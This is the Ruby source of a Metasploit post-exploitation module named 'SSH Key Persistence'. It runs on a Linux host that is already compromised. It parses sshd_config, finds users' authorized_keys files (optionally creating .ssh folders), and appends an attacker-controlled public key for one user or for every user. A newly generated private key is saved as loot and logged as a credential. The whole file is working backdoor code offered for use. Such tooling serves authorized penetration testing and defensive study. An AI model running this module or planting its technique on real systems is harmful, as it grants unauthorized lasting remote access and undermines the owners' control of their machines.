##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

#require 'msf/core'
#require 'msf/core/post/file'
require 'sshkey'

class MetasploitModule < Msf::Post
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Unix

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'SSH Key Persistence',
        'Description'    => %q{
          This module will add an SSH key to a specified user (or all), to allow
          remote login via SSH at any time.
        },
        'License'        => MSF_LICENSE,
        'Author'         =>
          [
            'h00die <mike@shorebreaksecurity.com>'
          ],
        'Platform'       => [ 'linux' ],
        'SessionTypes'   => [ 'meterpreter', 'shell' ],
        'Targets'        =>
          [
            [ 'Automatic', {} ]
          ],
        'DefaultTarget'  => 0
      )
    )

    register_options(
      [
        OptString.new('USERNAME', [false, 'User to add SSH key to (Default: all users on box)' ]),
        OptPath.new('PUBKEY', [false, 'Public Key File to use. (Default: Create a new one)' ]),
        OptString.new('SSHD_CONFIG', [true, 'sshd_config file', '/etc/ssh/sshd_config' ]),
        OptBool.new('CREATESSHFOLDER', [true, 'If no .ssh folder is found, create it for a user', false ])
      ], self.class
    )
  end

  def run
    if session.type == "meterpreter"
      sep = session.fs.file.separator
    else
      # Guess, but it's probably right
      sep = "/"
    end
    print_status('Checking SSH Permissions')
    sshd_config = read_file(datastore['SSHD_CONFIG'])
    /^PubkeyAuthentication[\s]+(?<pub_key>yes|no)/ =~ sshd_config
    if pub_key && pub_key == 'no'
      print_error('Pubkey Authentication disabled')
    elsif pub_key
      vprint_good("Pubkey set to #{pub_key}")
    end
    /^AuthorizedKeysFile[\s]+(?<auth_key_file>[\w%\/\.]+)/ =~ sshd_config
    if auth_key_file
      auth_key_file = auth_key_file.gsub('%h', '')
      auth_key_file = auth_key_file.gsub('%%', '%')
      if auth_key_file.start_with? '/'
        auth_key_file = auth_key_file[1..-1]
      end
    else
      auth_key_file = '.ssh/authorized_keys'
    end
    print_status("Authorized Keys File: #{auth_key_file}")

    auth_key_folder = auth_key_file.split('/')[0...-1].join('/')
    auth_key_file = auth_key_file.split('/')[-1]
    if datastore['USERNAME'].nil?
      print_status("Finding #{auth_key_folder} directories")
      paths = enum_user_directories.map { |d| d + "/#{auth_key_folder}" }
    else
      if datastore['USERNAME'] == 'root'
        paths = ["/#{datastore['USERNAME']}/#{auth_key_folder}"]
      else
        paths = ["/home/#{datastore['USERNAME']}/#{auth_key_folder}"]
      end
      vprint_status("Added User SSH Path: #{paths.first}")
    end

    if datastore['CREATESSHFOLDER'] == true
      vprint_status("Attempting to create ssh folders that don't exist")
      paths.each do |p|
        unless directory?(p)
          print_status("Creating #{p} folder")
          cmd_exec("mkdir -m 700 -p #{p}")
        end
      end
    end

    paths = paths.select { |d| directory?(d) }
    if paths.nil? || paths.empty?
      print_error("No users found with a #{auth_key_folder} directory")
      return
    end
    write_key(paths, auth_key_file, sep)
  end

  def write_key(paths, auth_key_file, sep)
    if datastore['PUBKEY'].nil?
      key = SSHKey.generate
      our_pub_key = key.ssh_public_key
      loot_path = store_loot("id_rsa", "text/plain", session, key.private_key, "ssh_id_rsa", "OpenSSH Private Key File")
      print_good("Storing new private key as #{loot_path}")
    else
      our_pub_key = ::File.read(datastore['PUBKEY'])
    end
    paths.each do |path|
      path.chomp!
      authorized_keys = "#{path}/#{auth_key_file}"
      print_status("Adding key to #{authorized_keys}")
      append_file(authorized_keys, "\n#{our_pub_key}")
      print_good("Key Added")
      if datastore['PUBKEY'].nil?
        path_array = path.split(sep)
        path_array.pop
        user = path_array.pop
        credential_data = {
          origin_type: :session,
          session_id: session_db_id,
          post_reference_name: refname,
          private_type: :ssh_key,
          private_data: key.private_key.to_s,
          username: user,
          workspace_id: myworkspace_id
        }

        create_credential(credential_data)
      end
    end
  end
end
